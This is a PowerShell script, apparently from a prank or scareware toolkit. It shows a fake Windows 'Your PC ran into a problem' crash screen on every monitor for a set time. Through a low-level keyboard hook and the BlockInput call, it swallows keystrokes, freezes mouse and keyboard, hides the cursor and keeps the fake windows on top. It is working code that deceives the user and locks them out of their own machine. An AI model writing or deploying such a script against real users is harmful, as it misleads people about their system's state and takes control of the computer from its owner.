$p = Get-Content "$PSScriptRoot\params_$($args[0]).json" | ConvertFrom-Json
$duration = $p.Time

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")] public static extern int ShowCursor(bool bShow);

    public delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelProc hookProc;

    public static void InstallHook() {
        hookProc = HookCallback;
        var mod = GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
        hookId = SetWindowsHookEx(13, hookProc, mod, 0);
    }
    public static void UninstallHook() { UnhookWindowsHookEx(hookId); }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) return (IntPtr)1;
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    public static void HideCursor() { for (int i = 0; i < 20; i++) ShowCursor(false); }
    public static void ShowCursorAgain() { for (int i = 0; i < 20; i++) ShowCursor(true); }
}
"@

[WinAPI]::InstallHook()
[WinAPI]::BlockInput($true)
[WinAPI]::HideCursor()

$qrMatrix = @(
    "1111111001101001111111",
    "1000001010101001000001",
    "1011101001001001011101",
    "1011101011010101011101",
    "1011101001101001011101",
    "1000001010010101000001",
    "1111111010101011111111",
    "0000000011010100000000",
    "1101101110101011010110",
    "0101010001010100010101",
    "1010110110100110101101",
    "0101001001010001010100",
    "1110111010110111011101",
    "0000000001010100000001",
    "1111111010110111100110",
    "1000001001001001001011",
    "1011101011010110110100",
    "1011101000101001010111",
    "1011101011010010101101",
    "1000001010100101000010",
    "1111111001011011111110"
)

function New-QRBitmap($size) {
    $rows = $qrMatrix.Count
    $cols = $qrMatrix[0].Length
    $bmp = New-Object System.Drawing.Bitmap($size, $size)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::None
    $g.Clear([System.Drawing.Color]::White)

    $quiet = 2
    $totalCells = $rows + $quiet * 2
    $cs = [math]::Floor($size / $totalCells)
    $offsetX = [math]::Floor(($size - $cs * $totalCells) / 2)
    $offsetY = $offsetX

    $black = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Black)

    for ($r = 0; $r -lt $rows; $r++) {
        for ($c = 0; $c -lt $cols; $c++) {
            if ($qrMatrix[$r][$c] -eq '1') {
                $x = $offsetX + ($c + $quiet) * $cs
                $y = $offsetY + ($r + $quiet) * $cs
                $g.FillRectangle($black, $x, $y, $cs, $cs)
            }
        }
    }

    $black.Dispose()
    $g.Dispose()
    return $bmp
}

$screens = [System.Windows.Forms.Screen]::AllScreens
$forms = @()

foreach ($screen in $screens) {
    $sw = $screen.Bounds.Width
    $sh = $screen.Bounds.Height

    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 212)
    $form.Bounds = $screen.Bounds
    $form.ShowInTaskbar = $false
    $form.KeyPreview = $true
    $form.Add_KeyDown({ $_.SuppressKeyPress = $true; $_.Handled = $true })

    $ml = [int]($sw * 0.10)
    $mt = [int]($sh * 0.13)

    $lFace = New-Object System.Windows.Forms.Label
    $lFace.Text = ":("
    $lFace.Font = New-Object System.Drawing.Font("Segoe UI Light", ([int]($sh * 0.15)), [System.Drawing.FontStyle]::Regular)
    $lFace.ForeColor = [System.Drawing.Color]::White
    $lFace.AutoSize = $true
    $lFace.Location = New-Object System.Drawing.Point($ml, $mt)
    $form.Controls.Add($lFace)

    $msgTop = $mt + [int]($sh * 0.27)
    $lMsg = New-Object System.Windows.Forms.Label
    $lMsg.Text = "Your PC ran into a problem and needs to restart. We're`njust collecting some error info, and then we'll restart for you."
    $lMsg.Font = New-Object System.Drawing.Font("Segoe UI", ([int]($sh * 0.026)), [System.Drawing.FontStyle]::Regular)
    $lMsg.ForeColor = [System.Drawing.Color]::White
    $lMsg.AutoSize = $true
    $lMsg.Location = New-Object System.Drawing.Point($ml, $msgTop)
    $form.Controls.Add($lMsg)

    $pctTop = $msgTop + [int]($sh * 0.15)
    $lPct = New-Object System.Windows.Forms.Label
    $lPct.Text = "0% complete"
    $lPct.Font = New-Object System.Drawing.Font("Segoe UI", ([int]($sh * 0.026)), [System.Drawing.FontStyle]::Regular)
    $lPct.ForeColor = [System.Drawing.Color]::White
    $lPct.AutoSize = $true
    $lPct.Location = New-Object System.Drawing.Point($ml, $pctTop)
    $form.Controls.Add($lPct)

    $qrTop  = $pctTop + [int]($sh * 0.11)
    $qrSize = [int]($sh * 0.13)
    $qrBmp  = New-QRBitmap $qrSize

    $qrBox = New-Object System.Windows.Forms.PictureBox
    $qrBox.Size = New-Object System.Drawing.Size($qrSize, $qrSize)
    $qrBox.Location = New-Object System.Drawing.Point($ml, $qrTop)
    $qrBox.Image = $qrBmp
    $qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Normal
    $qrBox.BackColor = [System.Drawing.Color]::White
    $form.Controls.Add($qrBox)

    $infoX  = $ml + $qrSize + [int]($sw * 0.018)
    $infoFs = [int]($sh * 0.014)
    $infoFont = New-Object System.Drawing.Font("Segoe UI", $infoFs, [System.Drawing.FontStyle]::Regular)

    $lI1 = New-Object System.Windows.Forms.Label
    $lI1.Text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode"
    $lI1.Font = $infoFont
    $lI1.ForeColor = [System.Drawing.Color]::White
    $lI1.AutoSize = $false
    $lI1.Width = [int]($sw * 0.40)
    $lI1.Height = [int]($sh * 0.07)
    $lI1.Location = New-Object System.Drawing.Point($infoX, $qrTop)
    $form.Controls.Add($lI1)

    $lI2 = New-Object System.Windows.Forms.Label
    $lI2.Text = "If you call a support person, give them this info:"
    $lI2.Font = $infoFont
    $lI2.ForeColor = [System.Drawing.Color]::White
    $lI2.AutoSize = $true
    $lI2.Location = New-Object System.Drawing.Point($infoX, ($qrTop + [int]($sh * 0.068)))
    $form.Controls.Add($lI2)

    $lI3 = New-Object System.Windows.Forms.Label
    $lI3.Text = "Stop code: CRITICAL_PROCESS_DIED"
    $lI3.Font = $infoFont
    $lI3.ForeColor = [System.Drawing.Color]::White
    $lI3.AutoSize = $true
    $lI3.Location = New-Object System.Drawing.Point($infoX, ($qrTop + [int]($sh * 0.098)))
    $form.Controls.Add($lI3)

    $forms += [PSCustomObject]@{ Form = $form; LabelPct = $lPct }
    $form.Show()
    $form.BringToFront()
    $form.Activate()
    $form.Focus()
}

$startTime = Get-Date
$endTime   = $startTime.AddSeconds($duration)
$tick      = 0

while ((Get-Date) -lt $endTime) {
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    $percent = [math]::Min([math]::Round(($elapsed / $duration) * 100), 100)

    foreach ($f in $forms) {
        $f.LabelPct.Text = "$percent% complete"
        $f.Form.TopMost  = $true
        $f.Form.BringToFront()
        $f.Form.Activate()
        $f.Form.Refresh()
    }

    $tick++
    if ($tick % 3 -eq 0) { [WinAPI]::HideCursor() }

    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 200
}

[WinAPI]::BlockInput($false)
[WinAPI]::UninstallHook()
[WinAPI]::ShowCursorAgain()

foreach ($f in $forms) {
    $f.Form.Close()
    $f.Form.Dispose()
}